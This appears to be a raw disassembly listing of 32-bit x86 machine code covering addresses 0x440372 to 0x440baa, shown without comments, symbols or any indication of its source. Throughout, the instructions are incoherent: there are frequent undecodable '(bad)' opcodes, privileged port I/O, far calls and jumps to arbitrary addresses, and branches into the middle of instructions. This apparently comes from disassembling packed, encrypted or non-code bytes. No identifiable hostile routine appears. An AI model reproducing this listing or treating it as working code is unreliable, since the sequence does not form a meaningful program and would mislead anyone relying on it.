  440372:	mov    ecx,0xcb237b64
  440377:	inc    ebx
  440378:	pop    ebp
  440379:	xchg   ecx,eax
  44037a:	mov    ebp,0x5ba5123e
  44037f:	cld    
  440380:	sahf   
  440381:	out    dx,eax
  440382:	aas    
  440383:	lods   al,BYTE PTR ds:[esi]
  440384:	inc    edi
  440385:	fcmovu st,st(7)
  440387:	mov    eax,ds:0x6dc8791f
  44038c:	(bad)  
  44038d:	mov    al,ds:0xf1f5bde8
  440392:	xor    ch,cl
  440394:	sbb    bh,ch
  440396:	(bad)  
  440398:	sbb    eax,0x15f382d9
  44039d:	inc    ebp
  44039e:	sub    bh,cl
  4403a0:	jb     0x4403cd
  4403a2:	repz int3 
  4403a4:	adc    eax,0x62e7ae67
  4403a9:	scas   eax,DWORD PTR es:[edi]
  4403aa:	ss xchg ebx,eax
  4403ac:	push   ss
  4403ad:	cdq    
  4403ae:	fs xchg edx,eax
  4403b0:	mov    ch,0x46
  4403b2:	pop    esi
  4403b3:	inc    eax
  4403b4:	inc    ebp
  4403b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4403b6:	fwait
  4403b7:	jno    0x440413
  4403b9:	bound  esp,QWORD PTR [ebx]
  4403bb:	mov    dh,BYTE PTR [edx]
  4403bd:	out    0xae,eax
  4403bf:	(bad)  
  4403c0:	and    DWORD PTR [eax],ecx
  4403c2:	mov    eax,0x1dfdd954
  4403c7:	jg     0x4403ee
  4403c9:	or     eax,DWORD PTR [esi]
  4403cb:	jmp    0x28952a31
  4403d0:	sbb    ch,BYTE PTR [ecx-0x71]
  4403d3:	daa    
  4403d4:	cmp    DWORD PTR [ebx-0x53],ebx
  4403d7:	push   ss
  4403d8:	pop    eax
  4403d9:	xchg   edi,eax
  4403da:	jg     0x4403db
  4403dc:	add    DWORD PTR [edx],ecx
  4403de:	mov    BYTE PTR [ecx-0x6a706ff2],al
  4403e4:	test   DWORD PTR [ebx-0x16da2947],edi
  4403ea:	adc    DWORD PTR [ebx+0x2e77cd35],ecx
  4403f0:	sbb    BYTE PTR [edi-0x64b57b15],ah
  4403f6:	aad    0x4f
  4403f8:	out    dx,eax
  4403f9:	jno    0x4403eb
  4403fb:	gs mov eax,esp
  4403fe:	mov    edi,0x6c6cd174
  440403:	add    al,0x64
  440405:	mov    ds:0x95b9948a,eax
  44040a:	pop    esp
  44040b:	pushf  
  44040c:	and    BYTE PTR [ecx],ch
  44040e:	and    bh,BYTE PTR ds:[ecx]
  440411:	xchg   BYTE PTR [ecx-0x3b],dh
  440414:	jp     0x9ac04bd1
  44041a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44041b:	int    0x80
  44041d:	pop    ss
  44041e:	imul   edi,edi,0xfffffff4
  440421:	call   0xc88a:0xa55a259b
  440428:	aad    0x27
  44042a:	(bad)  
  44042b:	popf   
  44042c:	mov    DWORD PTR [edi-0x10f0575d],esp
  440432:	pop    ebp
  440433:	jbe    0x4403ba
  440435:	retf   
  440436:	stos   DWORD PTR es:[edi],eax
  440437:	std    
  440438:	pop    ds
  440439:	jp     0x4403c3
  44043b:	repnz mov eax,ds:0x184b9d05
  440441:	(bad)  [ebx]
  440443:	imul   edx,DWORD PTR [ebp+0x48],0x6d8c8910
  44044a:	pop    ebp
  44044b:	mov    ebx,0xebef9a38
  440450:	ret    
  440451:	xchg   BYTE PTR [ebp+0x3a49246f],ch
  440457:	mov    eax,0x36f661b2
  44045c:	sbb    DWORD PTR [ebx],ebx
  44045e:	dec    edi
  44045f:	xchg   ebx,eax
  440460:	and    al,0xf1
  440462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440463:	cmp    eax,0x3a91c2a9
  440468:	std    
  440469:	ins    BYTE PTR es:[edi],dx
  44046a:	jnp    0x440413
  44046c:	mov    ch,0xbe
  44046e:	jo     0x440463
  440470:	icebp  
  440471:	in     al,0x78
  440473:	sti    
  440474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440475:	mov    esp,0x9f9ea27
  44047a:	add    BYTE PTR ds:0x3ce49b62,0x44
  440481:	sbb    edi,edi
  440483:	out    0x83,eax
  440485:	pushf  
  440486:	(bad)  
  440487:	not    esi
  440489:	sar    ebx,cl
  44048b:	jecxz  0x440481
  44048d:	daa    
  44048e:	data16 (bad) 
  440490:	sbb    al,BYTE PTR [edi+ebx*8-0x54]
  440494:	mov    ?,WORD PTR [ecx]
  440496:	inc    edi
  440497:	jl     0x4404fc
  440499:	pop    ss
  44049a:	std    
  44049b:	pop    esi
  44049c:	inc    edi
  44049d:	and    al,0xb4
  44049f:	and    BYTE PTR [ebp+0x74f366ae],ah
  4404a5:	shr    BYTE PTR [edx+0x47cf46c4],0xee
  4404ac:	or     DWORD PTR [edi-0x5e12d88b],esp
  4404b2:	mov    ebx,0x48108427
  4404b7:	or     cl,bh
  4404b9:	pop    esi
  4404ba:	lahf   
  4404bb:	test   eax,0x150546a2
  4404c0:	daa    
  4404c1:	fld    DWORD PTR [ebx+ecx*8+0x2f66744f]
  4404c8:	test   DWORD PTR [esi+0x54b96bc],edx
  4404ce:	fst    QWORD PTR [eax-0x2d]
  4404d2:	mov    edx,0x813edc26
  4404d7:	sub    edi,esp
  4404d9:	mov    cl,0xd5
  4404db:	mov    eax,0x68bedf78
  4404e0:	pop    eax
  4404e1:	mov    al,ds:0xf1dcad3b
  4404e6:	repnz or eax,0xde70835c
  4404ec:	xor    eax,0xbbd4bf21
  4404f1:	pusha  
  4404f2:	loope  0x44050e
  4404f4:	mov    DWORD PTR [ebx-0x72],ebx
  4404f7:	push   0x4cbd40f9
  4404fc:	rcl    BYTE PTR [eax+eax*2],cl
  4404ff:	imul   eax,DWORD PTR [ebx+0x27],0x74b674b5
  440506:	mov    ds,WORD PTR [edx-0xc2c016b]
  44050c:	fsubr  st,st(1)
  44050e:	dec    esi
  44050f:	call   0x49f8:0x8f453b65
  440516:	enter  0x8dbd,0xc9
  44051a:	loopne 0x440509
  44051c:	test   al,0x2a
  44051e:	sbb    al,0x6a
  440520:	add    eax,0x8c67958e
  440525:	or     BYTE PTR [ebp+0x23a94844],bh
  44052b:	stos   BYTE PTR es:[edi],al
  44052c:	sti    
  44052d:	push   edx
  44052e:	push   edx
  44052f:	mov    ch,0xa3
  440531:	gs popf 
  440533:	jbe    0x4404b5
  440535:	cdq    
  440536:	mov    ebx,0xbcbf377b
  44053b:	inc    edx
  44053c:	or     DWORD PTR [ebp+0x41],ecx
  44053f:	(bad)  
  440540:	push   eax
  440541:	pusha  
  440542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440543:	aad    0xc5
  440545:	xor    DWORD PTR [edx],ecx
  440547:	(bad)  
  440548:	fst    DWORD PTR [esi-0x30]
  44054b:	pop    ds
  44054c:	test   BYTE PTR gs:[ebp-0x16],cl
  440550:	pushf  
  440551:	push   esp
  440552:	inc    ebx
  440553:	xchg   ecx,eax
  440554:	sub    al,0xf9
  440556:	(bad)  
  440558:	lock rcr DWORD PTR [ebx+0x3389940],1
  44055f:	or     eax,0xe9237905
  440564:	mov    dl,0xf5
  440566:	and    dh,BYTE PTR ds:0x2acfb91c
  44056c:	add    DWORD PTR [ebp-0x50],edi
  44056f:	sbb    eax,0xdc1ba6c6
  440574:	call   FWORD PTR [eax-0x58edc90f]
  44057a:	cwde   
  44057b:	dec    ebp
  44057c:	enter  0xb6a7,0x44
  440580:	test   DWORD PTR [ebx],eax
  440582:	ret    0x929
  440585:	sbb    dl,al
  440587:	mov    eax,0xbcbd1eb5
  44058c:	dec    ecx
  44058d:	mov    ds:0xb9249cf9,eax
  440592:	mov    edx,0x66e2aedf
  440597:	scas   eax,DWORD PTR es:[edi]
  440598:	mov    DWORD PTR [edi-0x20f6e205],esp
  44059e:	xor    DWORD PTR [edx],eax
  4405a0:	add    eax,0xcaa93bb0
  4405a5:	std    
  4405a6:	mov    bh,0x4
  4405a8:	shr    DWORD PTR [ebx+0x51],0xca
  4405ac:	jge    0x4405c8
  4405ae:	ficom  DWORD PTR [ebx-0xc5598fb]
  4405b4:	pop    ecx
  4405b5:	cmc    
  4405b6:	mov    edi,0x20cefb2
  4405bb:	pop    edi
  4405bc:	xchg   DWORD PTR [ebp+0x1f],ecx
  4405bf:	pop    esp
  4405c0:	push   ds
  4405c1:	jl     0x440563
  4405c3:	push   ebp
  4405c4:	lea    ebp,[ecx]
  4405c6:	test   ecx,ebp
  4405c8:	jae    0x440581
  4405ca:	or     ecx,esi
  4405cc:	scas   eax,DWORD PTR es:[edi]
  4405cd:	fsub   DWORD PTR [ebp-0x32589ea5]
  4405d3:	imul   edx,DWORD PTR [edx+ebx*2],0xffffffab
  4405d7:	add    eax,0xe10fa493
  4405dc:	sbb    edx,DWORD PTR [edx-0x5ac2e18b]
  4405e2:	pop    ebx
  4405e3:	push   ecx
  4405e4:	xchg   ecx,eax
  4405e5:	retf   0xcc83
  4405e8:	je     0x440625
  4405ea:	arpl   WORD PTR [ecx-0x1b448f87],si
  4405f0:	ret    0x1a2
  4405f3:	imul   edx,DWORD PTR [esi],0xffffffc8
  4405f6:	les    ebx,FWORD PTR [eax+0x11]
  4405f9:	pushf  
  4405fa:	adc    eax,0x9043c1b7
  4405ff:	cld    
  440600:	lods   eax,DWORD PTR ds:[esi]
  440601:	pop    es
  440602:	mov    dl,0x64
  440604:	sbb    cl,BYTE PTR [ebx+ebp*1]
  440607:	jo     0x4405de
  440609:	sbb    al,0x1b
  44060b:	jmp    0x56a495d4
  440610:	inc    ebx
  440611:	mov    BYTE PTR [ecx],cl
  440613:	ins    BYTE PTR es:[edi],dx
  440614:	cmp    DWORD PTR ss:[ebx+0x612524df],esi
  44061b:	mov    ds:0x1da7a07c,al
  440620:	loop   0x4405c1
  440622:	mov    ebp,DWORD PTR [ebx]
  440624:	jbe    0x440618
  440626:	jl     0x4405ce
  440628:	scas   al,BYTE PTR es:[edi]
  440629:	inc    ebx
  44062a:	add    eax,0xb65ae8a9
  44062f:	jmp    DWORD PTR ds:0x88fdf0b9
  440635:	in     eax,0xc1
  440637:	test   al,0x90
  440639:	adc    ah,bh
  44063b:	bound  ecx,QWORD PTR [ecx-0x6c]
  44063e:	aas    
  44063f:	mov    ax,0x6db4
  440643:	out    dx,eax
  440644:	inc    esp
  440645:	loopne 0x44066c
  440647:	add    edx,DWORD PTR [ebx]
  440649:	into   
  44064a:	mov    ebp,0x777bfd24
  44064f:	add    BYTE PTR [esi-0x37a7f9cf],ah
  440655:	mov    ds:0x36e42bc,al
  44065a:	inc    esp
  44065b:	(bad)  
  44065c:	fisub  DWORD PTR [edx+edi*8-0x30fee30c]
  440663:	and    DWORD PTR [eax-0x28402463],ebx
  440669:	std    
  44066a:	pop    ebx
  44066b:	jge    0x44068a
  44066d:	mov    edx,0xefbcd669
  440672:	mov    edi,0x9fb1d5f4
  440677:	jecxz  0x4405fe
  440679:	pop    eax
  44067a:	repnz out dx,eax
  44067c:	sub    BYTE PTR ss:[ecx],cl
  44067f:	xchg   ecx,eax
  440680:	push   ds
  440681:	(bad)  [edi]
  440683:	jle    0x440665
  440685:	jmp    0xd3b:0xa5c8e188
  44068c:	pop    edi
  44068d:	ss jb  0x44066d
  440690:	hlt    
  440691:	in     eax,dx
  440692:	dec    ebx
  440693:	dec    esi
  440694:	cli    
  440695:	mov    dl,0xb5
  440697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440698:	mov    dh,0x8d
  44069a:	xchg   ecx,eax
  44069b:	dec    edx
  44069c:	in     eax,0x8e
  44069e:	sub    eax,0xa091b88d
  4406a3:	dec    esi
  4406a4:	mov    cs,ecx
  4406a6:	loope  0x4406c9
  4406a8:	push   ecx
  4406a9:	popf   
  4406aa:	pop    eax
  4406ab:	in     al,dx
  4406ac:	or     eax,0xcff1aa51
  4406b1:	in     al,0xbf
  4406b3:	les    eax,FWORD PTR [ecx-0xa517103]
  4406b9:	add    eax,0x5419e7b7
  4406be:	cs cmp al,0x89
  4406c1:	sbb    DWORD PTR [edi],edx
  4406c3:	ret    
  4406c4:	xchg   ecx,eax
  4406c5:	jl     0x440696
  4406c7:	sub    ch,BYTE PTR [edi-0x5a954bb9]
  4406cd:	fld    DWORD PTR [eax+esi*8+0x65]
  4406d1:	mov    eax,0xe919da2b
  4406d6:	rol    DWORD PTR [ebp+0x57],0x6f
  4406da:	in     al,dx
  4406db:	xchg   esp,eax
  4406dc:	mov    esi,0x35cb849d
  4406e1:	or     esp,0xffffffeb
  4406e4:	jp     0x440744
  4406e6:	mov    dl,dh
  4406e8:	and    al,0xf9
  4406ea:	cwde   
  4406eb:	in     al,dx
  4406ec:	pop    esp
  4406ed:	sub    eax,0x97cdcb49
  4406f2:	mov    ebp,0x3b9b37ba
  4406f7:	dec    esi
  4406f8:	or     DWORD PTR [esi+0xaf342f8],0xffffffae
  4406ff:	es sbb al,0x9d
  440702:	push   ds
  440703:	jns    0x440756
  440705:	retf   0x9025
  440708:	gs lahf 
  44070a:	add    bh,ch
  44070c:	imul   esi,DWORD PTR [esi+0x4922abe5],0xffffffbe
  440713:	add    DWORD PTR [eax+0x29],esi
  440716:	dec    esi
  440717:	je     0x440743
  440719:	jp     0x440787
  44071b:	jo     0x4406e7
  44071d:	in     eax,0x35
  44071f:	rol    DWORD PTR [edi-0x4aa33723],0xc8
  440726:	jmp    0xbeafc251
  44072b:	aam    0xf4
  44072d:	sahf   
  44072e:	jno    0x4406cd
  440730:	or     BYTE PTR ss:[edx],dl
  440733:	push   ds
  440734:	or     al,0xae
  440736:	mov    ebp,0x64d31cdc
  44073b:	mov    edi,0xcc2d10e8
  440740:	dec    edx
  440741:	aam    0xb5
  440743:	rol    DWORD PTR fs:[esi+0x6bc57494],1
  44074a:	xlat   BYTE PTR ds:[ebx]
  44074b:	in     al,0xb2
  44074d:	cmp    eax,0xd0366a5d
  440752:	mov    ds:0x695c62e8,al
  440757:	repz mov dl,0x56
  44075a:	mov    ecx,0xbaa53724
  44075f:	and    dh,0x24
  440762:	push   ebx
  440763:	fistp  DWORD PTR [eax]
  440765:	das    
  440766:	mov    dl,0xa7
  440768:	add    al,BYTE PTR [esi-0x23520707]
  44076e:	mov    bh,0xc4
  440770:	dec    ebx
  440771:	shl    esp,1
  440773:	loopne 0x44078c
  440775:	inc    edi
  440776:	js     0x440758
  440778:	push   ebp
  440779:	aaa    
  44077a:	push   0xffffffe9
  44077c:	popa   
  44077d:	add    BYTE PTR [esi-0x4accb52a],ch
  440783:	les    ecx,FWORD PTR [ecx+eax*8+0x15]
  440787:	in     eax,0xe5
  440789:	pusha  
  44078a:	and    ch,bl
  44078c:	mov    dh,0xdb
  44078e:	stc    
  44078f:	les    eax,FWORD PTR [ebx-0x76]
  440792:	test   al,0x92
  440794:	sbb    al,0xf9
  440796:	fcomp  DWORD PTR [ecx]
  440798:	sbb    DWORD PTR [ecx],0xd2592cf0
  44079e:	(bad)  
  44079f:	jb     0x44072b
  4407a1:	inc    ebp
  4407a2:	mov    edi,0xd0e19e24
  4407a7:	repnz inc edx
  4407a9:	mov    al,0x28
  4407ab:	xor    eax,0xb7c2022
  4407b0:	lea    ebx,[eax]
  4407b2:	into   
  4407b3:	jb     0x440796
  4407b5:	ror    BYTE PTR [esi-0x3a],0x22
  4407b9:	iret   
  4407ba:	mov    esi,0x8ba84da4
  4407bf:	pusha  
  4407c0:	xchg   edx,esp
  4407c2:	or     edi,0xf
  4407c5:	add    edx,ebp
  4407c7:	add    ah,BYTE PTR [edi-0x15]
  4407ca:	mov    ah,0x24
  4407cc:	pop    edx
  4407cd:	call   0x54597243
  4407d2:	fsubr  st(4),st
  4407d4:	mov    ebp,0x1d2667ce
  4407d9:	pop    ds
  4407da:	pop    edx
  4407db:	scas   eax,DWORD PTR es:[edi]
  4407dc:	push   ebx
  4407dd:	sbb    dh,BYTE PTR [ebp-0x5a]
  4407e0:	jne    0x440764
  4407e2:	daa    
  4407e3:	repnz (bad) 
  4407e5:	shr    al,cl
  4407e7:	xchg   BYTE PTR [edi],bl
  4407e9:	mov    DWORD PTR [ecx-0x2ea2c656],eax
  4407ef:	stos   DWORD PTR es:[edi],eax
  4407f0:	add    DWORD PTR ds:0x54874b0b,0xffffffb2
  4407f7:	xor    DWORD PTR [ecx+ebp*8],esp
  4407fa:	ret    0x19e2
  4407fd:	cmp    al,0x50
  4407ff:	rcl    DWORD PTR [esi],1
  440801:	sbb    DWORD PTR [eax],esi
  440803:	out    0x2,eax
  440805:	fnstcw WORD PTR [ebx+ebx*1]
  440808:	xchg   ebp,eax
  440809:	call   0xce17:0x24365484
  440810:	and    BYTE PTR [ebx+0x8],ah
  440813:	leave  
  440814:	lock mov dh,0xb8
  440817:	loopne 0x4407ad
  440819:	and    eax,0x4636c4bc
  44081e:	jmp    0x1bca:0x3cdc861f
  440825:	add    DWORD PTR [edi+ebp*8],edx
  440828:	repnz inc edx
  44082a:	push   ecx
  44082b:	mov    BYTE PTR [esp+esi*1-0x42],bh
  44082f:	mov    ah,0x4
  440831:	mov    ecx,0xa579da45
  440836:	inc    esi
  440837:	jns    0x44084f
  440839:	jns    0x440893
  44083b:	pop    eax
  44083c:	pop    eax
  44083d:	push   edx
  44083e:	pop    ecx
  44083f:	xor    DWORD PTR [edx+edi*8],ecx
  440842:	sbb    esi,DWORD PTR [eax-0x29825987]
  440848:	jp     0x440882
  44084a:	in     al,0x2e
  44084c:	xor    eax,0xb0ef974e
  440851:	out    dx,eax
  440852:	out    0x49,eax
  440854:	and    BYTE PTR [ecx+0x268ab484],bl
  44085a:	jl     0x440843
  44085c:	mov    edi,esi
  44085e:	sbb    al,0xab
  440860:	adc    DWORD PTR [ecx-0xae38574],0xd517c1a6
  44086a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44086b:	iret   
  44086c:	test   al,0x90
  44086e:	mov    dl,0x44
  440870:	mov    al,ds:0x15af09f5
  440875:	or     al,0xda
  440877:	in     al,0x4e
  440879:	or     esp,DWORD PTR ds:0x95b96710
  44087f:	cmp    eax,0xc61f9c5b
  440884:	icebp  
  440885:	and    al,0xe4
  440887:	sub    al,0xd1
  440889:	es jae 0x440886
  44088c:	mov    eax,0xf57283be
  440891:	jle    0x4408ff
  440893:	icebp  
  440894:	iret   
  440895:	ins    BYTE PTR es:[edi],dx
  440896:	push   esi
  440897:	cmp    DWORD PTR ds:0xe34a18d9,0x6b026b87
  4408a1:	(bad)  [ebx-0x1b]
  4408a4:	and    eax,0xd0eea195
  4408a9:	ret    0x9c22
  4408ac:	and    eax,0xf8735979
  4408b1:	(bad)  
  4408b2:	call   0x7bea72dd
  4408b7:	mov    DWORD PTR [esi],ecx
  4408b9:	or     ecx,DWORD PTR [eax-0x53]
  4408bc:	sub    al,0x2e
  4408be:	outs   dx,DWORD PTR ds:[esi]
  4408bf:	or     dl,bh
  4408c1:	adc    edi,DWORD PTR [ebp+0x546e08e4]
  4408c7:	(bad)  
  4408c8:	and    eax,0xa8f4518b
  4408cd:	inc    edi
  4408ce:	pop    edx
  4408cf:	popf   
  4408d0:	and    cl,cl
  4408d2:	rcr    DWORD PTR [edx+0xd18f693],0x93
  4408d9:	mov    esi,0x7ba5f662
  4408de:	add    ebp,ebp
  4408e0:	fld    DWORD PTR [esi+0x76]
  4408e3:	mov    edi,0xc365a0fd
  4408e8:	dec    esp
  4408e9:	inc    esp
  4408ea:	mov    ah,0xd4
  4408ec:	mov    ecx,0x76e90ec5
  4408f1:	inc    edx
  4408f2:	adc    dh,0x17
  4408f5:	std    
  4408f6:	test   al,0x1f
  4408f8:	push   ecx
  4408f9:	out    dx,eax
  4408fa:	xchg   ebx,eax
  4408fb:	icebp  
  4408fc:	into   
  4408fd:	ss mov ebp,0x89f82554
  440903:	adc    eax,0xf389cc95
  440908:	xor    BYTE PTR [eax-0x30d73b6],0x18
  44090f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440910:	cmc    
  440911:	mov    dh,0x73
  440913:	jmp    0x9b55:0xc1ce5521
  44091a:	pop    es
  44091b:	gs jmp eax
  44091e:	aas    
  44091f:	outs   dx,DWORD PTR ds:[esi]
  440920:	arpl   WORD PTR [edi-0x20],sp
  440923:	inc    ecx
  440924:	mov    edx,0xed44babd
  440929:	jmp    0x44093b
  44092b:	inc    ecx
  44092c:	push   ebp
  44092d:	jnp    0x4408dd
  44092f:	call   0xeb7d15d8
  440934:	and    bh,BYTE PTR [ecx]
  440936:	push   ds
  440937:	or     esp,DWORD PTR [ecx-0x10]
  44093a:	dec    eax
  44093b:	dec    edi
  44093c:	sbb    eax,0xc9061a65
  440941:	sbb    BYTE PTR ds:0x184df58d,dh
  440947:	hlt    
  440948:	xchg   esp,eax
  440949:	out    0x55,al
  44094b:	cmp    al,0x2f
  44094d:	or     DWORD PTR [eax],edi
  44094f:	aad    0x72
  440951:	dec    eax
  440952:	popa   
  440953:	cli    
  440954:	fisub  WORD PTR [ebp+0x63]
  440957:	cmc    
  440958:	pop    ebp
  440959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44095a:	fwait
  44095b:	xchg   edi,eax
  44095c:	not    BYTE PTR [ecx]
  44095e:	xchg   edx,eax
  44095f:	repnz mov ch,0xd7
  440962:	in     eax,dx
  440963:	mov    esp,0x64d5e1d2
  440968:	ror    BYTE PTR [edi],cl
  44096a:	je     0x44095a
  44096c:	sbb    ah,BYTE PTR [eax-0x5c3580fe]
  440972:	jnp    0x440924
  440974:	pop    ebx
  440975:	imul   edi,DWORD PTR [esi-0x6b],0x81646ede
  44097c:	sbb    BYTE PTR [ebp-0x36],0x44
  440980:	jo     0x44096e
  440982:	jmp    0x3be3c4f0
  440987:	loope  0x44093d
  440989:	sbb    bh,bh
  44098b:	sbb    al,0x5
  44098d:	or     BYTE PTR [esi],cl
  44098f:	shl    DWORD PTR [eax],1
  440991:	mov    al,0x29
  440993:	push   ebp
  440994:	sbb    DWORD PTR [esi+0x2c],edi
  440997:	adc    BYTE PTR [esi],dh
  440999:	adc    bl,BYTE PTR [ecx+ebx*4+0x6a06e52f]
  4409a0:	cmp    eax,eax
  4409a2:	push   es
  4409a3:	out    dx,eax
  4409a4:	sbb    BYTE PTR [ecx+0x58dbe3a7],cl
  4409aa:	xor    eax,0xcd6268e6
  4409af:	jge    0x440939
  4409b1:	cdq    
  4409b2:	das    
  4409b3:	pop    ss
  4409b4:	es or  ch,bh
  4409b7:	jne    0x44093f
  4409b9:	jns    0x44094e
  4409bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4409bc:	xchg   edi,eax
  4409bd:	jmp    0xfe63a8ef
  4409c2:	mov    ecx,0xfc6e057e
  4409c7:	in     eax,dx
  4409c8:	jg     0x440a32
  4409ca:	(bad)  
  4409cb:	neg    DWORD PTR ds:0x37e1dc9
  4409d1:	lahf   
  4409d2:	popa   
  4409d3:	js     0x440a50
  4409d5:	addr16 loopne 0x440a32
  4409d8:	and    al,0x49
  4409da:	mov    eax,0x8daf85c6
  4409df:	mov    edi,0x46a3521e
  4409e4:	out    dx,eax
  4409e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4409e6:	mov    ch,0x4
  4409e8:	nop
  4409e9:	popf   
  4409ea:	mov    al,0x8a
  4409ec:	imul   esp,DWORD PTR [edx],0x341488bd
  4409f2:	stos   DWORD PTR es:[edi],eax
  4409f3:	xchg   ebp,eax
  4409f4:	int3   
  4409f5:	shl    BYTE PTR [ebp-0x32d66b22],0xd6
  4409fc:	mov    ss,WORD PTR [eax+0x1b]
  4409ff:	fild   QWORD PTR [edx+ebx*1-0x4c]
  440a03:	jb     0x4409fa
  440a05:	test   DWORD PTR [edi],ecx
  440a07:	out    dx,eax
  440a08:	test   al,0xcb
  440a0a:	jle    0x440a58
  440a0c:	sbb    bh,BYTE PTR [ecx+0x3a]
  440a0f:	pop    eax
  440a10:	leave  
  440a11:	sar    DWORD PTR [edi-0x60],cl
  440a14:	cmp    eax,0x91691bb2
  440a19:	imul   ebp,DWORD PTR ds:0x37a2dc0e,0x54
  440a20:	mov    ecx,DWORD PTR [ecx-0x461de6c7]
  440a26:	dec    esi
  440a27:	sbb    BYTE PTR [edi],al
  440a29:	fdivr  DWORD PTR [ebx-0x62e415e6]
  440a2f:	ins    BYTE PTR es:[edi],dx
  440a30:	xor    esp,edx
  440a32:	mov    esi,0x37d0bd74
  440a37:	imul   ebx,eax,0x27
  440a3a:	mov    eax,0x2c869244
  440a3f:	jmp    0x4409d6
  440a41:	xchg   ecx,eax
  440a42:	mov    ch,0xf3
  440a44:	in     eax,dx
  440a45:	mov    esp,0xc9177706
  440a4a:	jecxz  0x440a77
  440a4c:	cmp    ch,al
  440a4e:	aas    
  440a4f:	ja     0x440aa6
  440a51:	push   es
  440a52:	and    esp,DWORD PTR [esi+0x8d8fb36]
  440a58:	mov    bh,0x3
  440a5a:	or     al,bl
  440a5c:	dec    ecx
  440a5d:	or     BYTE PTR [ecx+0x1992000],dh
  440a63:	pushf  
  440a64:	jle    0x440a77
  440a66:	cmp    eax,0xac0dbe0e
  440a6b:	jnp    0x440a86
  440a6d:	lods   eax,DWORD PTR ds:[esi]
  440a6e:	jp     0x440a20
  440a70:	add    ebx,DWORD PTR [ebp+0x6922ead6]
  440a76:	push   ecx
  440a77:	push   edx
  440a78:	shl    DWORD PTR [ebp+0x5d],1
  440a7b:	arpl   di,sp
  440a7d:	nop
  440a7e:	pop    esp
  440a7f:	cmp    DWORD PTR [esi-0x9c156ff],ebx
  440a85:	das    
  440a86:	mov    edi,0xfb3b64aa
  440a8b:	test   eax,0xb187d91f
  440a90:	ficomp DWORD PTR [esp+eax*2-0x44497a56]
  440a97:	in     eax,0x92
  440a99:	mov    ah,0x46
  440a9b:	(bad)  
  440a9d:	pushf  
  440a9e:	fnstcw WORD PTR ds:0xe8cbec65
  440aa4:	popa   
  440aa5:	aad    0x73
  440aa7:	inc    edx
  440aa8:	pop    ecx
  440aa9:	test   al,0x58
  440aab:	loope  0x440b1c
  440aad:	ret    0xbcb2
  440ab0:	ret    
  440ab1:	(bad)  
  440ab2:	sti    
  440ab3:	in     eax,dx
  440ab4:	push   es
  440ab5:	sbb    al,0xb3
  440ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440ab8:	int    0x81
  440aba:	das    
  440abb:	adc    eax,0xf237bf65
  440ac0:	nop
  440ac1:	test   al,0x55
  440ac3:	xchg   esp,eax
  440ac4:	int3   
  440ac5:	cmp    edi,edx
  440ac7:	stc    
  440ac8:	cmp    esp,DWORD PTR [ebx+0x46bb4bf3]
  440ace:	adc    eax,0x54f55b3
  440ad3:	in     eax,dx
  440ad4:	pop    esi
  440ad5:	test   BYTE PTR [eax],bh
  440ad7:	mov    BYTE PTR [eax],ah
  440ad9:	imul   edx,DWORD PTR [edi-0x11],0xcb738bc
  440ae0:	inc    ebp
  440ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440ae2:	or     ebx,DWORD PTR [edx+0x31]
  440ae5:	pop    eax
  440ae6:	adc    eax,0x5077224c
  440aeb:	add    ecx,esp
  440aed:	lock mov edx,0x4b1c0c04
  440af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440af4:	mov    ch,0xdc
  440af6:	add    bh,ah
  440af8:	mov    ds:0xd79d0c2b,eax
  440afd:	dec    edx
  440afe:	adc    BYTE PTR cs:[esi],0x2d
  440b02:	ds mov ecx,0xc3ca3a1b
  440b08:	jne    0x440b33
  440b0a:	jno    0x440af8
  440b0c:	sub    dl,cl
  440b0e:	les    ebx,FWORD PTR [esi]
  440b10:	dec    edx
  440b11:	stc    
  440b12:	dec    edx
  440b13:	dec    ebx
  440b14:	aad    0x99
  440b16:	pop    edx
  440b17:	pop    eax
  440b18:	and    ah,al
  440b1a:	aaa    
  440b1b:	mov    ds:0x86b1122,al
  440b20:	jl     0x440b95
  440b22:	mov    edx,0xdbea4734
  440b27:	or     ebp,DWORD PTR [edi]
  440b29:	or     DWORD PTR [edi],eax
  440b2b:	jae    0x440b9e
  440b2d:	shl    DWORD PTR [edx-0xa5ecb61],1
  440b33:	xor    BYTE PTR [ecx+0x3cf29b9b],al
  440b39:	jge    0x440b68
  440b3b:	push   ds
  440b3c:	pop    ds
  440b3d:	(bad)  
  440b3e:	mov    ecx,0xf3ca75d2
  440b43:	hlt    
  440b44:	and    eax,DWORD PTR [ecx]
  440b46:	ret    0x9097
  440b49:	mov    eax,ds:0x6d483b3b
  440b4e:	add    esp,DWORD PTR [ebx-0x3d]
  440b51:	jle    0x440aec
  440b53:	push   ds
  440b54:	mov    eax,ds:0x8714ba33
  440b59:	inc    ebp
  440b5a:	dec    esp
  440b5b:	cwde   
  440b5c:	jl     0x440bb5
  440b5e:	mov    edi,0x1a7b11e6
  440b63:	ja     0x440b5a
  440b65:	mov    ebp,0x6150e86a
  440b6a:	inc    esp
  440b6b:	cli    
  440b6c:	jo     0x440b6e
  440b6e:	dec    ebp
  440b6f:	xor    eax,0xeae7f7f5
  440b74:	jne    0x440b18
  440b76:	mov    ebx,0x54423d9b
  440b7b:	mov    ebx,0x787d0b4
  440b80:	and    BYTE PTR [ebx-0x6659e765],bl
  440b86:	jns    0x440bb5
  440b88:	mov    ebp,0x621bbab
  440b8d:	iret   
  440b8e:	cs xor ebx,DWORD PTR ss:[edx]
  440b92:	fwait
  440b93:	and    eax,0xa6bed91f
  440b98:	outs   dx,DWORD PTR ds:[esi]
  440b99:	and    ebx,DWORD PTR [esp+ecx*8-0x20045f0e]
  440ba0:	mov    DWORD PTR [ebx],ebp
  440ba2:	std    
  440ba3:	call   0xb0ada95c
  440ba8:	loopne 0x440b78
  440baa:	mov    ecx,0x3e55d754
